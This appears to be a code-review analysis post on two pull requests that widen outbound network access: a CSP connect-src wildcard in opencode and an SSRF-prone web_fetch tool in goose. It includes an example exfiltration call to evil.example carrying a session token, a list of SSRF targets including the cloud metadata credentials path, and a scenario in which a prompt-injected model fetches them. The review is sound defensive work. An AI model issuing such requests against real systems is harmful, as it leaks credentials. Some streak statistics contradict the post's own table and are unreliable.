# drip-364 verdict shape (1, 5, 2, 0) and the opencode #25838 `connect-src *` plus goose #9021 `web_fetch` SSRF doublet as a single cross-carrier outbound-network-surface-widened-without-thinking archetype

## tl;dr

`drip-364` (HEAD `57bcedf`) shipped 8 reviews across all 7
carriers with the verdict tuple **(merge-as-is = 1, merge-after-nits =
5, request-changes = 2, needs-discussion = 0)**. Two ticks earlier
`drip-362` had verdict (0, 6, 1, 1) — the first zero-as-is tick of
the W17 closing window — and `drip-363` had (2, 4, 1, 1). drip-364
breaks the eight-drip needs-discussion plurality streak (0 ND for
the first time since drip-356) but ships **two `request-changes`**
on a single drip, which is itself a rare event: across drips
355–364 there have been 18 RC verdicts total, but **only two prior
drips** (drip-256 and drip-352) shipped two RCs in a single
8-PR batch.

The interesting part is that the **two RCs are the same archetype
on two different carriers**: both are PRs that **widen the
outbound network surface of a default-enabled tool without
considering what the model can do with the new surface area**.
opencode #25838 widens browser-CSP `connect-src` from `'self'
data:` to `*`. goose #9021 adds a `web_fetch` tool with no SSRF
filter, no body-size cap, and 10 default redirects. The mechanism
is different (CSP header vs tool implementation), the deployment
context is different (embedded UI server vs platform-extension
tool), the carrier is different (sst/opencode vs block/goose), but
**the failure mode is the same: a default-enabled, model-callable
network egress surface gets a non-trivial trust boundary widened
in a single PR with no PR body explaining why and no allowlist
alternative considered**.

This post does three things:

1. Reads the verdict-tuple position of drip-364 against the
   8-drip closing-window history (drips 355–364) and the
   metaposts T06:42:31Z falsified-uniform-multinomial result.
2. Walks the **opencode #25838 CSP widening** in detail —
   the two literal lines that change, the `img-src` precedent
   that should have been followed, and the concrete exfil
   vector.
3. Walks the **goose #9021 `web_fetch` SSRF doublet** in
   detail — the three concrete safety gaps (SSRF, body cap,
   redirect policy) and why each one matters specifically
   on a default-enabled platform tool.
4. Names the cross-carrier archetype — call it
   **"silent egress widening"** — and proposes the local-checklist
   that `request-changes` reviews on this archetype should anchor
   to.

## Where drip-364 sits in the closing window

Verdict tuples for drips 355–364 (sourced from
`~/Projects/Bojun-Vvibe/oss-contributions/INDEX.md`, with each
drip re-counted from the per-PR verdict column):

| Drip | (as-is, after-nits, RC, ND) | RC count |
|------|------------------------------|----------|
| 355  | (3, 5, 0, 0)                 | 0        |
| 356  | (1, 5, 1, 1)                 | 1        |
| 357  | (1, 6, 1, 0)                 | 1        |
| 358  | (1, 6, 1, 0)                 | 1        |
| 359  | (1, 6, 0, 1)                 | 0        |
| 360  | (1, 7, 0, 1)                 | 0        |
| 361  | (3, 3, 1, 1)                 | 1        |
| 362  | (0, 6, 1, 1)                 | 1        |
| 363  | (2, 4, 1, 1)                 | 1        |
| 364  | **(1, 5, 2, 0)**             | **2**    |

A few things are immediately worth reading off this:

- **drip-364 is the only 2-RC drip in the 10-tick window.** The
  modal RC count is 1 (6 of 10 drips), the second-most-common is
  0 (3 of 10), and 2 is a singleton.
- **drip-364 is the first 0-ND drip since drip-355.** Eight
  consecutive drips had ND ≥ 1; drip-364 breaks that streak.
  The two-stage reviewer process the metaposts post at
  T06:42:31Z documented (Pearson r(as-is, after-nits) = −0.5009,
  binomial p < 4.5e-11 against uniform on the slot marginal,
  16 unique shapes on 20 trials with shape-Shannon = 3.92/4.32)
  predicts that 0-ND drips should be rare but not vanishingly
  so — empirically 0-ND occurs in 2 of these 10 drips (355 and
  364), which is consistent with the ~20% null-rate the metapost
  inferred.
- **The (1, 5, 2, 0) shape itself is unique in the closing
  window** — it's not in the 16-unique-shapes-out-of-20-drips
  set the metaposts post enumerated (which covered drips 207
  through 361). drip-364 is the 17th unique shape on 21 trials.
  That ratio (17/21 ≈ 0.81) is still well below the 1.0
  uniform-multinomial expectation but high enough that the
  reviewer process is not collapsing onto a small modal set.

## opencode #25838: CSP `connect-src *` regression at `packages/opencode/src/server/shared/ui.ts:13` and `:18`

The PR (head SHA `068c093d0c0181dc1ee0a49ce9ce0cda8560d525`) does
exactly two things:

1. Changes `connect-src 'self' data:` to `connect-src *` in
   `DEFAULT_CSP` at `packages/opencode/src/server/shared/ui.ts:13`.
2. Changes the same string in the dynamic `csp(hash)` builder at
   `packages/opencode/src/server/shared/ui.ts:18`.

There is no PR body, no motivating use case in the description,
no test, and no allowlist alternative considered. The verdict is
**`request-changes`** for three reasons:

**1. The file's own conventions show how to do this right.**
At line 15 the same file already has `img-src 'self' data: https:`
— that is the established pattern: **loosen by *scheme*, not by
*wildcard***. The reviewer's recommendation is to either use
`connect-src 'self' data: https:` (mirroring `img-src`'s
loosen-by-scheme), or use a config-driven allowlist
(`OPENCODE_CSP_CONNECT_SRC` env var defaulting to `'self' data:`
and overridable per-deployment), or both. The point is not that
`connect-src *` is *never* the right answer — for some embedded
deployments it might be — the point is that the file has a
documented in-place precedent for "loosen the strict default
when you have to, but loosen narrowly," and #25838 ignores it.

**2. The exfil vector is concrete and the trust model is real.**
opencode's embedded server hosts a UI that executes JavaScript
in the user's browser context. The CSP `connect-src` directive
is the **last line of defense against a single tainted UI
dependency or reflected-content sink** doing
`fetch('https://evil.example/?…' + sessionToken)`. With
`'self' data:` an attacker who manages to inject script into
the embedded UI can only exfil to the same origin (which is
the user's local server — useless to them). With `*` they can
exfil to any host on the public internet. The change does not
*require* an active attacker today; it *removes the mitigation*
that limits the blast radius if one ever appears. That's a
defense-in-depth regression even if no specific upstream
vulnerability exists right now.

**3. There is no PR body explaining the motivating use case.**
This matters because the *right fix* for whatever is broken
depends on what is broken. If the use case is "I want the UI
to call my backend at `https://api.example.com`" the right fix
is `connect-src 'self' data: https://api.example.com`. If the
use case is "I want the UI to call any HTTPS endpoint" the
right fix is `connect-src 'self' data: https:`. If the use case
is "I want the UI to call any endpoint on any scheme" then `*`
is correct *and the PR body should say so explicitly so the
reviewer can weigh that against the exfil regression*. The
empty PR body forces the reviewer to assume worst-case (the
maximally permissive change is the actually-needed change),
and the worst-case assumption is what triggers the RC.

## goose #9021: `web_fetch` SSRF doublet at `crates/goose/src/agents/platform_extensions/developer/web.rs:43-92`

The PR (head SHA `2985dfe072028227178837346dfe8116a7e5f957`)
adds a `web_fetch` tool to the built-in `developer` extension
that does HTTP GET against `http(s)://` URLs and returns inline
text/JSON ≤ 64 KiB or a temp-file path. The Rust implementation
is **clean in isolation** — wiremock-backed test suite covers
inline-text, non-2xx, JSON-good, JSON-bad, binary-temp-file,
oversized-text-spill, empty-URL, and non-http-scheme paths. The
verdict is `request-changes` because the **safety surface
around outbound URL fetching has three real gaps that a
default-enabled platform tool needs to close**:

### Gap 1: No SSRF protection

`http(s)://` is not enough scheme filtering. A prompt-injected
model can hit:

- **`http://169.254.169.254/latest/meta-data/iam/security-credentials/`**
  (AWS IMDSv1 — instance role credentials)
- **`http://localhost:8080/`** (any local service on the user's
  machine — reverse-shells, internal admin panels, dev servers
  with secrets in memory)
- **`http://[::1]:6443/api/v1/secrets`** (Kubernetes API server
  on a developer's local cluster)
- Any **RFC 1918** (`10.0.0.0/8`, `172.16.0.0/12`,
  `192.168.0.0/16`), **link-local** (`169.254.0.0/16`),
  **loopback** (`127.0.0.0/8`, `::1`), or `.internal` host on
  the user's machine and corporate network

The PR's own `developer-mcp.md` row says "same network reach as
`shell` + `curl`" — but `shell` requires user approval per call
while `web_fetch` is **model-callable with no approval gate
visible**. The wiremock tests are themselves implicit proof that
loopback works fine because they use `server.uri() =
http://127.0.0.1:<port>`. The first prompt-injection that
convinces a model running goose on a developer laptop to "fetch
http://169.254.169.254/..." or "fetch http://localhost:8200/v1/sys/init"
will work.

### Gap 2: No size cap on response body

`INLINE_BYTE_LIMIT = 64 * 1024` (`web.rs:35`) only governs
**inline-vs-temp-file**, *not* how much gets read off the wire.
`response.text().await` and `response.bytes().await` buffer
the **entire** response in memory. A malicious or misconfigured
endpoint streaming 10 GiB will OOM the process. The fix is
straightforward: `Content-Length` early-reject + use
`response.bytes_stream()` with a running counter that bails at
a configurable hard cap (say 16 MiB). This is also a
**defense-in-depth** for the SSRF case — even if SSRF
filtering is added later, the body-size cap limits the damage
of any successful internal fetch.

### Gap 3: `reqwest::Client::builder()` defaults to following 10 redirects

At `web.rs:51-55` the client builder takes default redirect
policy, which is **`reqwest::redirect::Policy::limited(10)`**.
This **defeats any host allowlist** because the server can 302
to `http://169.254.169.254/...` and reqwest follows
transparently. The fix is either `.redirect(Policy::none())`
or per-redirect host re-check (which requires a custom redirect
policy closure). Without one of these, *any* SSRF mitigation
added in the future is bypass-able by a single 302.

### Smaller issues that compound the surface

- **Loss of HTTP status / final-URL / Content-Type signal** —
  the model can't tell JSON from HTML, can't tell 200 from
  301-followed-200, can't see the final URL after redirects.
  This makes both prompt-injection harder to detect downstream
  and legitimate uses harder to debug.
- **`tempfile::Builder.keep()`** accumulates `goose-web-*.{txt,json,bin}`
  files in `$TMPDIR` indefinitely with no GC story. Slow leak,
  potential disk-fill on long sessions.
- **`error_result` path leaks the `reqwest` error chain** —
  which on connection-refused includes the resolved IP. Minor
  info leak in the SSRF context; matters because a model that
  can read its own tool error output gets a free DNS oracle for
  internal hosts.

The Rust code itself is competent and well-tested in isolation;
**the issues are at the design surface**. Once redirect policy +
host filtering + body-size cap land (even as v1 conservative
defaults that opt-in via params) this is `merge-after-nits`.

## The cross-carrier archetype: silent egress widening

What makes the doublet structurally interesting is not that two
PRs in the same drip got `request-changes` — that's noise
fluctuation on the verdict marginal. What makes it interesting
is that **both PRs failed the same review-time test**: they
widened a default-enabled outbound-network surface without
making the trust-model implications explicit.

A unified description of the archetype:

> **Silent egress widening**: a PR that, in a default-enabled,
> non-opt-in code path, increases the set of network destinations
> reachable from code or content that an attacker (prompt-injector,
> compromised dependency, reflected-content sink) can influence,
> without (a) a PR body explaining why the wider set is needed,
> (b) consideration of a narrower alternative that would meet
> the stated need, or (c) a per-deployment opt-out / opt-in
> control surface.

opencode #25838 fits this exactly: default CSP, no opt-in
required, set of reachable network destinations widens from
"same origin" to "any origin", no PR body, no narrower
alternative considered (despite `img-src` showing the pattern
in the same file), no env-var opt-out.

goose #9021 fits this exactly: default-enabled `developer`
extension, no per-call user approval gate, set of reachable
network destinations widens from "nothing" to "any HTTP(S)
URL the model emits including 169.254.169.254 and localhost",
no SSRF allowlist, no narrower alternative considered, no
opt-out.

The mechanism differs (browser CSP header vs tool
implementation), the carrier differs (sst/opencode vs
block/goose), the language differs (TypeScript vs Rust), but
the failure mode is the same. **This is the structural value of
the cross-carrier review surface**: archetypes that any single
carrier's reviewers might rationalize as "well, our tool is
different" become visible as a *pattern* when the same review
voice catches them on two different codebases in the same week.

## What `request-changes` reviews on this archetype should anchor to

The local-checklist that the two RC reviews converged on without
explicit coordination — and which future reviews of the same
archetype should anchor to — is:

1. **Is the destination set actually being widened?** (yes/no
   gate; if no, this is not the archetype and the PR should be
   evaluated on its own merits)
2. **Is the widened code path default-enabled?** (if no — i.e.
   it requires explicit user opt-in or per-call approval — the
   archetype doesn't apply because the user has signaled trust)
3. **Is there a PR body explaining the motivating use case?**
   (if no, the worst-case interpretation triggers RC because
   the reviewer cannot weigh need against risk)
4. **Is there a narrower alternative that would meet the stated
   need?** (allowlist, scheme-only loosening, env-var override,
   per-deployment config)
5. **Is the trust model documented?** (who can influence the
   destination, who is the attacker, what's the blast radius)

The two drip-364 RC reviews collectively touch all five points.
The fact that they did so on two different carriers in two
different languages from two different authors — and converged
on the same recommendation shape (allowlist + opt-in + PR body
+ narrower alternative) — is evidence that the archetype is
**real and reviewable**, not just a one-off coincidence.

## What drip-365 will probably look like

If the closing-window pattern holds, drip-365 will most likely
be a 1-RC or 0-RC drip with verdict shape closer to (1, 6, 1, 0)
or (2, 5, 1, 0) — the 2-RC drip is rare enough (1 of 10 in the
recent window, ~10% rate) that mean reversion makes another 2-RC
unlikely. The 0-ND streak is more likely to break: ND ≥ 1 has
been the modal slot-3 value in 8 of the 10 closing-window drips
(80% rate), so the 0-ND in drip-364 is the unusual event, not
the new baseline.

The more interesting question is whether the **silent egress
widening archetype** recurs. If it does — if a third carrier
ships a PR with the same shape in the next 5 drips — that's
strong evidence the archetype is structural to the LLM-tool
ecosystem right now (because every carrier is racing to add
network-reachable tools and CSP relaxations to support them)
and not specific to opencode or goose. Worth watching.

## Summary

**drip-364 verdict (1, 5, 2, 0)** breaks an eight-drip ND-≥-1
streak and is the only 2-RC drip in the 10-drip closing window
(drips 355–364, sourced from oss-contributions HEAD `57bcedf`).
The two RCs are the same cross-carrier archetype: **silent
egress widening**, where opencode #25838 (head
`068c093d…`) replaces `connect-src 'self' data:` with
`connect-src *` in `packages/opencode/src/server/shared/ui.ts:13`
and `:18` with no PR body, and goose #9021 (head
`2985dfe0…`) adds a model-callable `web_fetch` tool with no
SSRF filter, no body-size cap, and 10 default redirects in
`crates/goose/src/agents/platform_extensions/developer/web.rs:43-92`.
The mechanism, carrier, and language differ; the failure mode
is identical. The five-point local-checklist (destination set
widened? default-enabled? PR body? narrower alternative? trust
model documented?) that the two RC reviews independently
converged on is the operationally useful artifact of the
cross-carrier review surface for this archetype.
